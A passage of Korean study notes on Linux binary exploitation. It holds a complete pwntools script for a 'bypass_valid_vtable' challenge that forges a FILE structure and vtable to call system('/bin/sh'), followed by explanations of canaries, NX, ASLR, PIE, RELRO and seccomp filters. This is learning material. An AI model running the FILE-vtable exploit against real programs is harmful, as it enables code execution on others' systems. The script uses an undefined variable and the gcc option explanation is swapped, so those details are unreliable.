 04:0020│  0x7ffff7dca380 (_IO_str_jumps+32) —▸ 0x7ffff7a71eb0 (_IO_str_underflow) ◂— mov rax, qword ptr [rdi + 0x28]
 05:0028│  0x7ffff7dca388 (_IO_str_jumps+40) —▸ 0x7ffff7a70370 (_IO_default_uflow) ◂— push rbp
 06:0030│  0x7ffff7dca390 (_IO_str_jumps+48) —▸ 0x7ffff7a72280 (_IO_str_pbackfail) ◂— test byte ptr [rdi], 8
 07:0038│  0x7ffff7dca398 (_IO_str_jumps+56) —▸ 0x7ffff7a703d0 (_IO_default_xsputn) ◂— test rdx, rdx

 # 참고
 pwndbg&gt; x/x _IO_file_overflow
 0x7ffff7a6f2b0 &lt;_IO_new_file_overflow&gt;: 0xc1f60f8b
 pwndbg&gt; x/x _IO_str_overflow
 0x7ffff7a71f10 &lt;__GI__IO_str_overflow&gt;: 0xc1f60f8b
 # 주소는 같지만 _IO_file_overflow 으로는 사용 불가
</code></pre></li><li><p><code>_s._allocate_buffer</code> = system, <code>_IO_buf_end</code> = (&rsquo;/bin/sh 의 주소&rsquo; - 100) / 2, <code>_IO_buf_base</code> = 0 이 되도록 vtable을 설정한다.</p><ul><li>프로그램에서 파일 포인터의 주소를 획득하여 <code>_s._allocate_buffer</code> 함수의 주소를 획득한다.</li><li>libc 에서 &ldquo;/bin/sh&rdquo; 문자열과 <code>system</code> 함수의 주소를 획득한다.</li></ul></li></ol></li><li><p>전체 코드</p><pre tabindex=0><code>#!/usr/bin/env python3
from pwn import *
p = process(&#39;./bypass_valid_vtable&#39;, env={&#39;LD_PRELOAD&#39;:&#39;./libc.so.6&#39;})
libc = ELF(&#39;./libc.so.6&#39;)
elf = ELF(&#39;./bypass_valid_vtable&#39;)
p.recvuntil(b&#39;stdout: &#39;)  # 필요없는 출력 버리기
leak = int(p.recvuntil(b&#39;\n&#39;).strip(b&#39;\n&#39;), 16)  # 문제에서 일부러 유출시킨 stdout 의 주소

# [1] _IO_file_jumps 주소 획득
libc_base = leak - libc.symbols[&#39;_IO_2_1_stdout_&#39;]  # libc_base 주소 획득. stdout 의 주소에서 stdout 의 offset 빼기
io_file_jumps = libc_base + libc.symbols[&#39;_IO_file_jumps&#39;]  # _IO_jump_t 구조체(vtable)의 주소 획득

# [2-1] _IO_str_overflow 주소 획득, vtable 시작주소 변조
io_str_overflow = io_file_jumps + 0xd8  # _IO_str_overflow 함수의 주소가 저장된 위치의 주소를 획득
fake_vtable = io_str_overflow - 16  # fclose는 vtable + 16byte 에 위치한 함수(_IO_finish_t) 을 실행시킨다. vtable + 16byte 위치에 _IO_str_overflow 함수가 존재하도록 vtable 주소를 역산한다.

# [3-1] libc 에서 필요한 요소들 주소 획득, 파일 포인터 &#39;fp&#39; 주소 획득
binsh = libc_base + next(libc.search(b&#39;/bin/sh&#39;))  # &#34;/bin/sh&#34; 문자열이 저장된 주소 획득
system = libc_base + libc.symbols[&#39;system&#39;]  # system 함수의 주소 획득
fp = elf.symbols[&#39;fp&#39;]

# 디버깅
print(f&#39;io_file_jumps: 0x{io_file_jumps:X}&#39;)
print(f&#39;io_file_overflow: 0x{io_file_overflow:X}&#39;)
print(f&#39;io_str_overflow: 0x{io_str_overflow:X}&#39;)
print(f&#39;fake_vtable: 0x{fake_vtable:X}&#39;)

# payload 작성
payload = p64(0x0) # flags, 미사용
payload += p64(0x0) # _IO_read_ptr, 미사용
payload += p64(0x0) # _IO_read_end, 미사용
payload += p64(0x0) # _IO_read_base, 미사용
payload += p64(0x0) # _IO_write_base, 미사용
payload += p64(( (binsh - 100) // 2 )) # _IO_write_ptr, [3-2] 2 * (_IO_buf_end - _IO_buf_base) + 100 값이 &#34;/bin/sh&#34; 문자열의 주소를 가키리도록 설정
payload += p64(0x0) # _IO_write_end, 미사용
payload += p64(0x0) # _IO_buf_base, [3-2] 0으로 세팅
payload += p64(( (binsh - 100) // 2 )) # _IO_buf_end
payload += p64(0x0) # _IO_save_base, 미사용
payload += p64(0x0) # _IO_backup_base, 미사용
payload += p64(0x0) # _IO_save_end, 미사용
payload += p64(0x0) # _IO_marker, 미사용
payload += p64(0x0) # _IO_chain, 미사용
payload += p64(0x0) # _fileno, _flags2 (int, int), 미사용
payload += p64(0x0) # _old_offset, 미사용
payload += p64(0x0) # _cur_column, _vtable_offset, _shortbuf (short, char, short, + 구조체 최적화용 padding), 미사용
payload += p64(fp + 0x80) # _lock, [3-2] fp 값을 덮어쓴 이후 적당히 오염되어도 되는 자리를 지정
payload += p64(0x0) * 9 # _offset, _codecvt, _wide_data, _freeres_list, _freeres_buf, __pad5, _mode, _unused2 (총 72byte), 미사용
payload += p64(fake_vtable) # io_file_jump overwrite, [2-2] 변조한 vtable 주소 세팅
payload += p64(system) # fp-&gt;_s._allocate_buffer, [3-2] _allocate_buffer 함수를 system 함수로 대체
p.sendline(payload)
p.interactive()
</code></pre></li></ul><h2 id=보호-기법>보호 기법<a hidden class=anchor aria-hidden=true href=#보호-기법>#</a></h2><ul><li>앞서 살펴본 취약점을 방어하기 위한 기법들을 소개한다.</li></ul><h3 id=stack-canary>Stack Canary<a hidden class=anchor aria-hidden=true href=#stack-canary>#</a></h3><ul><li>광부들이 탄광에 들어갈 때 카나리아 새를 데리고 들어간다. 카나리아는 인간보다 가스에 민감하여, 유독가스로 인해 위험한 상황이 발생 할 경우 카나리아가 먼저 이를 인지하고 이상 행동을 보이게 된다. 광부들은 카나리아의 행동을 관찰하며 위험한 환경에서 빨리 탈출할 수 있다.</li><li>탄광의 카나리아 새를 따서 Stack의 overflow를 감지하는 기능도 Stack Canary 라 이름 짓는다.</li><li>우분투에서 C 파일을 컴파일 할 때 기본적으로 Stack Canary를 적용하며, <code>-fno-stack-protector</code> 옵션을 넣어 gcc 컴파일을 하면 Stack Canary 설정을 끌 수 있다.</li><li>Stack이 오염되면 대부분은 <code>Segmentation Fault</code> 오류를 발생하며 종료된다.</li><li>Stack Canary가 설정되어 있으면 <code>stack smashing detected</code> 오류가 대신 발생한다. 이는 Stack의 오염이 감지되어 강제로 프로그램이 종료됨을 의미한다.</li><li>Stack Canary의 동작을 어셈블리어로 표현하면 다음과 같다.<pre tabindex=0><code>	mov    rax,QWORD PTR fs:0x28    # fs 레지스터의 0x28값을 rax에 대입
  mov    QWORD PTR [rbp-0x8],rax  # 스택 카나리를 rbp-8에 저장
  call   FUNCTION                 # 함수 호출

  ...

  mov    rcx,QWORD PTR [rbp-0x8]  # rbp-8에서 스택 카나리 추출
  xor    rcx,QWORD PTR fs:0x28    # fs:0x28과 스택 카나리 비교
  je     0x6f0 &lt;main+94&gt;          # 값이 같으면 다르면 호출부로 이동
  call   __stack_chk_fail@plt     # 값이 다르면 에러 출력
</code></pre><ul><li>fs는 세그먼트 레지스터의 일종으로, 리눅스는 부팅시 fs:0x28 위치에 랜덤 생성하여 저장한다.</li></ul></li><li>X64 아키텍처는 8바이트, X86 아키텍처는 4바이트 카나리를 사용한다.</li><li>stack에 적용될 때 x64 아키텍처는 8바이트, x86 아키텍처는 4바이트 더미값 이후 canary가 들어감에 주의한다.<ul><li><a href=../../assembly/assembly_basic/#%EC%8A%A4%ED%83%9D%ED%94%84%EB%A0%88%EC%9E%84>stack참조</a></li></ul></li><li>카나리는 NULL 값으로 시작한다.</li><li>카나리는 TLS에 전역변수로 저장되고, 각 함수들이 이를 공용으로 참조한다.</li></ul><h3 id=nx>NX<a hidden class=anchor aria-hidden=true href=#nx>#</a></h3><ul><li>No eXecute의 약자로, 실행에 사용되는 메모리 영역과 writing에 사용되는 메모리 영역을 분리하여 악의적으로 buffer에 코드를 심어 실행시키는 행위를 방지하는 기법이다.</li><li>NX 기법은 CPU가 지원해야 동작할 수 있다.</li><li>NX가 적용된 바이너리를 gdb로 디버깅 하여 <code>vmmap</code> 명령으로 각 주소의 권한을 살펴보면 <code>Perm</code> 영역이 &lsquo;rw&rsquo;와 &lsquo;x&rsquo; 가 분리된 것이 확인된다.</li><li>실행 권한이 없는 주소를 실행시키려 하면 segment fault 가 발생하며 코드가 종료되게 된다.</li><li>NX기법은 XD(eXecution Disable), DEP(Data Execution Prevention), XN(eXecute Never) 등으로 불리기도 한다.</li></ul><h3 id=aslr>ASLR<a hidden class=anchor aria-hidden=true href=#aslr>#</a></h3><ul><li>Address Space Layout Randomization 의 약자로 바이너리가 실행 될 때 마다 매번 다른 주소값에 메모리 세그먼트들을 할당하여 주소의 유출을 방지하는 기법이다.</li><li>커널에서 ASLR을 지원해야 동작이 가능하다.</li><li>리눅스에서 <code>cat /proc/sys/kernel/randomize_va_space</code> 명령으로 해당 커널이 ASLR을 지원하는지 확인 가능하다.<ul><li>0 : ASLR 미지원</li><li>1 : stack, heap, library, vdso 등의 주소를 랜덤화</li><li>2 : (1) 에 더해 brk 영역도 랜덤화</li></ul></li><li>리눅스는 ASLR이 적용됐을 때, 페이지(page) 단위로 파일을 매핑하기 때문에 주소값 64비트 중 상위 52비트의 주소는 바뀌어도 하위 12비트는 변경되지 않는다.<ul><li>0x1111111111111222 : 1은 변경될 수 있고, 2는 고정</li><li>예를들어 라이브러리의 printf의 함수의 주소가 0x12345678이라면, 다음번 실행시에도 마지막 12비트는 678임이 보장된다.</li></ul></li><li>main 함수의 주소는 여러번 실행해도 변경되지 않는다.</li></ul><h3 id=pie>PIE<a hidden class=anchor aria-hidden=true href=#pie>#</a></h3><ul><li><p>Position Independent Executable 의 약자이다.</p></li><li><p>ASLR이 런타임에 생성되는 stack, heap, library 영역의 메모리를 랜덤 매핑하는 기법이었다면, PIE는 code 영역의 메모리를 랜덤하게 매핑하는 보호 기법이다.</p></li><li><p>리눅스의 ELF는 Executable(실행파일) 파일과 Shared Object(공유파일) 로 양분되는데 Shared Object 는 메모리 상에 어디에 올려놓아도 동작 가능하도록 설계되어 있다.</p></li><li><p>메모리 위치에 제약을 받지 않는 이러한 성질을 가진 코드를 <code>Position-Independent Code</code> 줄여서 <code>PIC</code> 라 부른다.</p></li><li><p>Shared Object 들은 최초 설계 시에 PIC 속성을 갖도록 설계되었고, Executable 파일들은 그렇지 않았다. 실행 파일들도 PIC 속성을 갖게 하려고 Shared Object 형태로 구성하였고, 이를 <code>PIE</code>(Position-Independent Executable) 라 명명하였다.</p></li><li><p>PIE로 구성된 코드들은 ASLR 이 적용되면 다른 Shared Object 와 마찬가지로 랜덤한 주소에 배치받게 된다.</p></li><li><p>ASLR에 의해 PIE 코드가 랜덤한 메모리에 적재되면 그 시작 주소를 <code>base code</code>, 혹은 <code>PIE base</code> 라 칭한다.</p></li><li><p><code>PIE</code> 보호기법이 적용되면 <code>code</code> 영역과 <code>bss</code> 영역의 메모리는 실행시 마다 랜덤하게 배정된다.</p></li></ul><h3 id=relro-relocation-read-only>RELRO (RELocation Read-Only)<a hidden class=anchor aria-hidden=true href=#relro-relocation-read-only>#</a></h3><ul><li>데이터 세그먼트에서 불필요한 쓰기 권한을 제거하여 공격을 방지하는 방법</li><li>Partial RELRO 와 Full RELRO 두 가지 방법이 있다.<ul><li>gcc 컴파일 시 <code>-no-pie -fno-pie</code> 옵션을 넣어서 pie를 제거하면 partial RELRO 로 동작한다.</li><li><code>-no-pie</code>는 코드 생성 옵션이고, <code>-fno-pie</code>는 링킹 과정의 옵션으로 둘 다 설정해야 PIE 없이 바이너리가 생성된다.</li><li>위 두 옵션 없이 gcc 컴파일을 수행하면 Full RELRO가 적용된다.</li></ul></li><li>Partial RELRO 가 적용된 파일을 <code>objdump -h</code> 명령어로 확인하면 section에 <code>.got</code>와 <code>.got.plt</code> 가 확인된다.<ul><li><code>.got</code> section에는 실행되기 전에 바인딩 되는 전역변수들이 저장되며 쓰기 권한이 없다.</li><li><code>.got.plt</code> section에는 실행되는 도중 바인딩 되는 전역변수들이 저장되며 쓰기 권한이 부여된다.</li><li><code>.got.plt</code> 영역을 덮어쓰는 <code>GOT overwrite</code> 공격에 취약하다.</li></ul></li><li>Full RELRO 가 적용되면 함수들의 주소가 바이너리 로딩 시점에 모두 바인딩 되므로 .got 영역에는 쓰기 권한이 부여되지 않는다.<ul><li>동적 메모리 할당/해제시 동작하는 <code>hook</code> 을 이용한 공격인 <code>Hook Overwrite</code> 에 취약하다.</li></ul></li></ul><h4 id=segment-권한-확인-방법>segment 권한 확인 방법<a hidden class=anchor aria-hidden=true href=#segment-권한-확인-방법>#</a></h4><ol><li>특정 프로세스에서 <code>/proc/self/maps</code> 경로의 파일을 출력하도록 코드를 작성한다.</li><li>작성한 코드를 컴파일 하고, 실행 파일을 생성한다.</li><li>실행 파일을 실행하여 <code>/proc/self/maps</code> 파일 내용을 확인한다.</li></ol><ul><li>내용 중 <code>파일명</code> 에 해당하는 부분이 메모리 시작주소이다.</li><li>ex) <code>objdump -h /usr/bin/cat</code> 결과이다. <code>/usr/bin/cat</code> 의 메모리 시작주소는 0x561210c55000 가 된다.<pre tabindex=0><code>561210c55000-561210c57000 r--p 00000000 08:20 1773                       /usr/bin/cat
561210c57000-561210c5c000 r-xp 00002000 08:20 1773                       /usr/bin/cat
561210c5c000-561210c5f000 r--p 00007000 08:20 1773                       /usr/bin/cat
561210c5f000-561210c60000 r--p 00009000 08:20 1773                       /usr/bin/cat
561210c60000-561210c61000 rw-p 0000a000 08:20 1773                       /usr/bin/cat
5612123c3000-5612123e4000 rw-p 00000000 00:00 0                          [heap]
7f84ddb0a000-7f84ddb2c000 rw-p 00000000 00:00 0
7f84ddb2c000-7f84ddb5e000 r--p 00000000 08:20 25559                      /usr/lib/locale/C.UTF-8/LC_CTYPE
7f84ddb5e000-7f84ddb5f000 r--p 00000000 08:20 25620                      /usr/lib/locale/C.UTF-8/LC_NUMERIC
7f84ddb5f000-7f84ddb60000 r--p 00000000 08:20 26418                      /usr/lib/locale/C.UTF-8/LC_TIME
7f84ddb60000-7f84ddcd3000 r--p 00000000 08:20 25554                      /usr/lib/locale/C.UTF-8/LC_COLLATE
7f84ddcd3000-7f84ddcd4000 r--p 00000000 08:20 25593                      /usr/lib/locale/C.UTF-8/LC_MONETARY
7f84ddcd4000-7f84ddcd5000 r--p 00000000 08:20 25575                      /usr/lib/locale/C.UTF-8/LC_MESSAGES/SYS_LC_MESSAGES
7f84ddcd5000-7f84ddcd6000 r--p 00000000 08:20 26123                      /usr/lib/locale/C.UTF-8/LC_PAPER
7f84ddcd6000-7f84ddcd7000 r--p 00000000 08:20 25601                      /usr/lib/locale/C.UTF-8/LC_NAME
7f84ddcd7000-7f84ddfbd000 r--p 00000000 08:20 15009                      /usr/lib/locale/locale-archive
7f84ddfbd000-7f84ddfdf000 r--p 00000000 08:20 42427                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f84ddfdf000-7f84de157000 r-xp 00022000 08:20 42427                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f84de157000-7f84de1a5000 r--p 0019a000 08:20 42427                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f84de1a5000-7f84de1a9000 r--p 001e7000 08:20 42427                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f84de1a9000-7f84de1ab000 rw-p 001eb000 08:20 42427                      /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f84de1ab000-7f84de1b1000 rw-p 00000000 00:00 0
7f84de1b1000-7f84de1b2000 r--p 00000000 08:20 25549                      /usr/lib/locale/C.UTF-8/LC_ADDRESS
7f84de1b2000-7f84de1b3000 r--p 00000000 08:20 26189                      /usr/lib/locale/C.UTF-8/LC_TELEPHONE
7f84de1b3000-7f84de1b4000 r--p 00000000 08:20 25574                      /usr/lib/locale/C.UTF-8/LC_MEASUREMENT
7f84de1b4000-7f84de1bb000 r--s 00000000 08:20 42694                      /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
7f84de1bb000-7f84de1bc000 r--p 00000000 08:20 42407                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f84de1bc000-7f84de1df000 r-xp 00001000 08:20 42407                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f84de1df000-7f84de1e7000 r--p 00024000 08:20 42407                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f84de1e7000-7f84de1e8000 r--p 00000000 08:20 25569                      /usr/lib/locale/C.UTF-8/LC_IDENTIFICATION
7f84de1e8000-7f84de1e9000 r--p 0002c000 08:20 42407                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f84de1e9000-7f84de1ea000 rw-p 0002d000 08:20 42407                      /usr/lib/x86_64-linux-gnu/ld-2.31.so
7f84de1ea000-7f84de1eb000 rw-p 00000000 00:00 0
7ffcf0c34000-7ffcf0c55000 rw-p 00000000 00:00 0                          [stack]
7ffcf0d14000-7ffcf0d18000 r--p 00000000 00:00 0                          [vvar]
7ffcf0d18000-7ffcf0d1a000 r-xp 00000000 00:00 0                          [vdso]
</code></pre></li></ul><ol start=4><li>생성한 실행파일을 <code>objdump -h</code> 명령어를 사용해 section header를 확인한다.</li></ol><ul><li>section header의 VMA에 해당하는 부분이 메모리의 offset이다. (3)에서 찾은 메모리 시작주소에 offset을 더하면 실제 메모리 주소를 확인할 수 있다.</li><li>ex) <code>.plt</code> 의 메모리 주소는 0x561210c55000 + 0x0000000000002020 = <code>0x561210C57020</code> 가 된다.<pre tabindex=0><code>/usr/bin/cat:     file format elf64-x86-64

Sections:
Idx Name          Size      VMA               LMA               File off  Algn
0 .interp       0000001c  0000000000000318  0000000000000318  00000318  2**0
                CONTENTS, ALLOC, LOAD, READONLY, DATA
1 .note.gnu.property 00000020  0000000000000338  0000000000000338  00000338  2**3
                CONTENTS, ALLOC, LOAD, READONLY, DATA
2 .note.gnu.build-id 00000024  0000000000000358  0000000000000358  00000358  2**2
                CONTENTS, ALLOC, LOAD, READONLY, DATA
3 .note.ABI-tag 00000020  000000000000037c  000000000000037c  0000037c  2**2
                CONTENTS, ALLOC, LOAD, READONLY, DATA
4 .gnu.hash     0000006c  00000000000003a0  00000000000003a0  000003a0  2**3
                CONTENTS, ALLOC, LOAD, READONLY, DATA
5 .dynsym       00000690  0000000000000410  0000000000000410  00000410  2**3
                CONTENTS, ALLOC, LOAD, READONLY, DATA
6 .dynstr       0000033d  0000000000000aa0  0000000000000aa0  00000aa0  2**0
                CONTENTS, ALLOC, LOAD, READONLY, DATA
7 .gnu.version  0000008c  0000000000000dde  0000000000000dde  00000dde  2**1
                CONTENTS, ALLOC, LOAD, READONLY, DATA
8 .gnu.version_r 00000060  0000000000000e70  0000000000000e70  00000e70  2**3
                CONTENTS, ALLOC, LOAD, READONLY, DATA
9 .rela.dyn     00000378  0000000000000ed0  0000000000000ed0  00000ed0  2**3
                CONTENTS, ALLOC, LOAD, READONLY, DATA
10 .rela.plt     00000498  0000000000001248  0000000000001248  00001248  2**3
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
11 .init         0000001b  0000000000002000  0000000000002000  00002000  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
12 .plt          00000320  0000000000002020  0000000000002020  00002020  2**4
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
13 .plt.got      00000010  0000000000002340  0000000000002340  00002340  2**4
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
14 .plt.sec      00000310  0000000000002350  0000000000002350  00002350  2**4
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
15 .text         00003dc2  0000000000002660  0000000000002660  00002660  2**4
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
16 .fini         0000000d  0000000000006424  0000000000006424  00006424  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
17 .rodata       0000122c  0000000000007000  0000000000007000  00007000  2**5
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
18 .eh_frame_hdr 000002bc  000000000000822c  000000000000822c  0000822c  2**2
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
19 .eh_frame     00000ce8  00000000000084e8  00000000000084e8  000084e8  2**3
                  CONTENTS, ALLOC, LOAD, READONLY, DATA
20 .init_array   00000008  000000000000aa90  000000000000aa90  00009a90  2**3
                  CONTENTS, ALLOC, LOAD, DATA
21 .fini_array   00000008  000000000000aa98  000000000000aa98  00009a98  2**3
                  CONTENTS, ALLOC, LOAD, DATA
22 .data.rel.ro  00000198  000000000000aaa0  000000000000aaa0  00009aa0  2**5
                  CONTENTS, ALLOC, LOAD, DATA
23 .dynamic      000001f0  000000000000ac38  000000000000ac38  00009c38  2**3
                  CONTENTS, ALLOC, LOAD, DATA
24 .got          000001c8  000000000000ae28  000000000000ae28  00009e28  2**3
                  CONTENTS, ALLOC, LOAD, DATA
25 .data         000000c0  000000000000b000  000000000000b000  0000a000  2**5
                  CONTENTS, ALLOC, LOAD, DATA
26 .bss          00000198  000000000000b0c0  000000000000b0c0  0000a0c0  2**5
                  ALLOC
27 .gnu_debuglink 00000034  0000000000000000  0000000000000000  0000a0c0  2**2
                  CONTENTS, READONLY
</code></pre></li></ul><ol start=5><li>(4)에서 확인한 메모리 주소가 (3)에서 출력한 메모리 주소별 권한을 대조하여, 해당 영역의 권한을 확인할 수 있다.</li></ol><ul><li>.plt 영역인 <code>0x561210C57020</code> 는
<code>561210c57000-561210c5c000 r-xp 00002000 08:20 1773 /usr/bin/cat</code> 라인에 해당하며, 읽기/실행 권한이 있고, 쓰기 권한은 부여되지 않은 것이 확인된다.</li><li>RELRO가 적용되어 <code>.fini_array</code> 와 <code>.init_array</code> 영역은 쓰기 권한이 없는 것이 확인된다.</li><li>checksec 명령으로 확인 결과 Full RELRO가 적용된 것이 확인된다.<pre tabindex=0><code>checksec /usr/bin/cat
[*] &#39;/usr/bin/cat&#39;
  Arch:     amd64-64-little
  RELRO:    Full RELRO
  Stack:    Canary found
  NX:       NX enabled
  PIE:      PIE enabled
  FORTIFY:  Enabled
</code></pre></li></ul><h3 id=sandbox>Sandbox<a hidden class=anchor aria-hidden=true href=#sandbox>#</a></h3><ul><li>외부와 내부의 환경을 분리하여 외부로부터 시스템을 격리 보호하는 기법으로, Allow List / Deny List 를 통해 필요한 시스템 콜 혹은 파일 접근 권한만 허용하여 외부 공격을 최소화 한다.</li></ul><h4 id=seccomp>SECCOMP<a hidden class=anchor aria-hidden=true href=#seccomp>#</a></h4><ul><li>리눅스 커널에서 샌드박스 매커니즘을 제공하는 보안 기능으로, <code>SECure COMPuting mode</code> 를 축약한 단어이다.</li><li>허가되지 않은 시스템 콜을 어플리케이션에서 호출 할 경우, SECCOMP는 즉시 어플리케이션을 종료시킨다.</li><li>SECCOMP는 두 가지 모드로 동작을 설정 할 수 있다.</li></ul><ol><li>SECCOMP_MODE_STRICT</li></ol><ul><li>read , write , exit , sigreturn 만 호출이 가능한 모드</li><li>이외의 시스템 콜이 호출되면 SIGKILL 시그널을 발생시킨다.</li></ul><ol start=2><li>SECCOMP_MODE_FILTER</li></ol><ul><li>원하는 시스템 콜을 필터에 넣고 관리 할 수 있는 모드</li><li><a href=https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/>Linux 시스템콜 index 참조</a></li><li>seccomp 라이브러리를 활용할 시, <code>seccomp-tools</code> 로 검사하면 시스템콜의 번호가 <code>0x40000000</code> 보다 작은지 검사하는 로직이 검출된다는 특징이 있다.<ul><li>ex) <code>0x35 0x00 0x01 0x40000000 if (A &lt; 0x40000000) goto 0005</code></li><li>x86-64 ABI(Application Binary Interface) 는 x32 ABI 를 호환할 수 있지만, 두 ABI 는 엄연히 다르고 x86-64 ABI 인지 x32 ABI 인지를 구분짓기 위해 0x40000000 과 비교대소를 수행한다.</li><li>x86-64 에서 시스템 콜을 호출하는 함수인 <code>do_syscall_64</code> 는 x86-64의 시스템 콜 호출에 실패하면 x32 시스템 콜 호출을 시도하도록 작성되어 있다.</li><li>x32 시스템콜은 x86-64 시스템 콜에 <code>__X32_SYSCALL_BIT</code> 를 더한 값으로 지정되어 있으며, <code>__X32_SYSCALL_BIT</code> 의 값이 바로 <code>0x40000000</code> 이다.</li><li></li></ul></li></ul><h5 id=설치-및-사용>설치 및 사용<a hidden class=anchor aria-hidden=true href=#설치-및-사용>#</a></h5><ul><li>apt를 이용한 설치 : <code>apt install libseccomp-dev libseccomp2 seccomp</code></li><li>사용 방법:<pre tabindex=0><code>#include &lt;linux/seccomp.h&gt;
...

prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);  // STRICT 모드로 동작
</code></pre><pre tabindex=0><code>#include &lt;linux/seccomp.h&gt;
...
// filter mode 로 동작
scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);  // 시스템 콜 호출시 발생할 이벤트 함수 설정. SCMP_ACT_KILL 은 따로 정의하지 않은 모든 시스템 콜에 대해 default 로 SIGKILL 반환한다는 뜻
// seccomp_init(SCMP_ACT_ALLOW) 는 반대로 따로 정의하지 않은 모든 시스템 콜에 대해 default 로 실행을 허가한다는 뜻
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(rt_sigreturn), 0);  // 규칙 추가. &#39;rt_sigreturn&#39; 시스템 콜 허용
seccomp_rule_add(ctx, SCMP_ACT_KILL, SCMP_SYS(open), 0);  // 규칙 추가. &#39;open&#39; 시스템 콜 금지
seccomp_load();  // 위에서 반영한 규칙들 적용
</code></pre></li><li>strict mode 에서는 system call 호출시 __secure_computing_strict() 함수가 호출되고, __NR_seccomp_read, __NR_seccomp_write, __NR_seccomp_exit, __NR_seccomp_sigreturn 가 아닌 system call 이 호출되었다면 SIGKILL 을 발생시키고 SECCOMP_RET_KILL 을 반환한다.</li><li>BPF (Berkeley Packet Filter) : 커널에서 지원하는 VM으로, 데이터를 비교하고 결과에 따라 특정 구문으로 분기하도록 설정 할 수 있어 네트워크 패킷을 분석하고 필터링 하는 용도로 주로 사용하였으나, 특정 시스템 콜 호출 시 수행 될 동작을 결정하는 용도롤도 사용이 가능하다.<ul><li>명령어 조합 및 매크로를 사용하여 동작 구문을 작성 할 수 있다.<ul><li>명령어:<ul><li>BPF_LD: 인자로 전달된 값 복사</li><li>BPF_JMP: 지정한 분기로 이동</li><li>BPF_JEQ: 비교 값이 참일 경우 지정한 위치로 이동</li><li>BPF_RET: 인자로 전달된 값 반환</li></ul></li><li>매크로:<ul><li>BPF_STMT</li><li>BPF_JUMP</li></ul></li><li>사용 예시:<pre tabindex=0><code>BPF_STMT(BPF_LD + BPF_W + BPF_ABS, arch_nr)  // 매크로를 활용해 쉽게 명령어 실행
BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, ARCH_NR, 1, 0)  // argv[1], argv[2] 비교 결과에 따라 특정 offset(argv[3] or argv[4]) 로 분기
</code></pre><ul><li>아키텍처 검사:</li></ul><pre tabindex=0><code>// X86_64라면 다음 코드로 분기하고, 다른 아키텍처라면 SECCOMP_RET_KILL을 반환
#define arch_nr (offsetof(struct seccomp_data, arch))
#define ARCH_NR AUDIT_ARCH_X86_64
BPF_STMT(BPF_LD+BPF_W+BPF_ABS, arch_nr),
BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, ARCH_NR, 1, 0),
BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL),
</code></pre><ul><li>시스템콜 검사:</li></ul><pre tabindex=0><code>// ALLOW_SYSCALL 로 허가된 SYSTEM CALLL 외에는 SIGKILL 반환하며 시스템 종료
#define ALLOW_SYSCALL(name) \
  BPF_JUMP(BPF_JMP+BPF_JEQ+BPF_K, __NR_##name, 0, 1), \
  BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_ALLOW

#define KILL_PROCESS \
  BPF_STMT(BPF_RET+BPF_K, SECCOMP_RET_KILL)

BPF_STMT(BPF_LD+BPF_W+BPF_ABS, syscall_nr),
ALLOW_SYSCALL(rt_sigreturn),
ALLOW_SYSCALL(open),
ALLOW_SYSCALL(openat),
ALLOW_SYSCALL(read),
ALLOW_SYSCALL(write),
ALLOW_SYSCALL(exit_group),
KILL_PROCESS,
</code></pre><ul><li>pctrl 설정 후 BPF로 시스템 콜 필터링</li></ul><pre tabindex=0><code>#include &lt;fcntl.h&gt;
#include &lt;linux/audit.h&gt;
#include &lt;linux/filter.h&gt;
#include &lt;linux/seccomp.h&gt;
#include &lt;linux/unistd.h&gt;
#include &lt;stddef.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/prctl.h&gt;
#include &lt;unistd.h&gt;
#define DENY_SYSCALL(name)                                \
  BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_##name, 0, 1), \
      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL)
#define MAINTAIN_PROCESS BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW)
#define syscall_nr (offsetof(struct seccomp_data, nr))
#define arch_nr (offsetof(struct seccomp_data, arch))
/* architecture x86_64 */
#define ARCH_NR AUDIT_ARCH_X86_64
int sandbox() {
  struct sock_filter filter[] = {
      /* Validate architecture. */
      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, arch_nr),
      BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, ARCH_NR, 1, 0),
      BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_KILL),
      /* Get system call number. */
      BPF_STMT(BPF_LD + BPF_W + BPF_ABS, syscall_nr),
      /* List allowed syscalls. */
      DENY_SYSCALL(open),
      DENY_SYSCALL(openat),
      MAINTAIN_PROCESS,
  };
  struct sock_fprog prog = {
      .len = (unsigned short)(sizeof(filter) / sizeof(filter[0])),
      .filter = filter,
  };
  if (prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0) == -1) {
    perror(&#34;prctl(PR_SET_NO_NEW_PRIVS)\n&#34;);
    return -1;
  }
  if (prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;prog) == -1) {
